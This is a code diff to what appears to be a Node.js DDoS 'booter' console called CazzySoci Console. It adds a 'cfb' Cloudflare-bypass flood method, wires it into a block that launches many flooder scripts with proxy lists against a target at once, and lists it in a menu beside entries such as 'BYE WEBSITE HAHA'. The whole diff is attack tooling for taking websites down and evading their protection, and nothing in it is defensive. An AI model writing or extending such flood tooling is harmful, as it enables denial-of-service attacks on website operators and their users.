@@ -379,6 +379,10 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
        pushOngoing(target, methods, duration)
 	exec(`node ${metode} ${target} ${duration} 30 100 proxy.txt`)
 	  sigma()
+	  } else if (methods === 'cfb') {
+       pushOngoing(target, methods, duration)
+	exec(`node ${metode} ${target} ${duration}`)
+	  sigma()
 	  
 const flood = path.join(__dirname, `/lib/cache/flood.js`);
 const tls = path.join(__dirname, `/lib/cache/tls.js`);
@@ -398,6 +402,7 @@ const kupal = path.join(__dirname, `/lib/cache/jennessee.js`);
 const lol = path.join(__dirname, `/lib/cache/xyecoc.js`);
 const cf = path.join(__dirname, `/lib/cache/CF-FLOODER.js`);
 const vendetta = path.join(__dirname, `/lib/cache/CF-Bypass.js`);
+const cfb = path.join(__dirname, `/lib/cache/cfb.js`);
         exec(`node ${flood} ${target} ${duration}`)
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
@@ -416,6 +421,7 @@ const vendetta = path.join(__dirname, `/lib/cache/CF-Bypass.js`);
 	exec(`node ${lol} ${target} ${duration} 30 100 proxy.txt --proxy`)
 	exec(`node ${cf} POST ${target} proxy.txt ${duration} 30 100 cookie=mycookie postdata="param1=value1&param2=value2" randomstring=randomparam headerdata="Custom-Header=Value"`)
 	exec(`node ${vendetta} ${target} ${duration} 30 10 proxy.txt`)
+	exec(`node ${cfb} ${target} ${duration}`)
 	
 	
 	  
@@ -732,6 +738,7 @@ permen.question('[\x1b[1m\x1b[32mCazzySoci Console\x1b[0m]: \n', (input) => {
 || kupal      || DOWN/BYPASS Ex: https://target.com?q=%RAND%
 || lol        || BYE WEBSITE HAHA 
 || vendetta   || CLOUDFARE BYPASS 
+|| cfb        || CLOUD-FARE BYPASSER
 [=========================================]
 `);
     sigma();
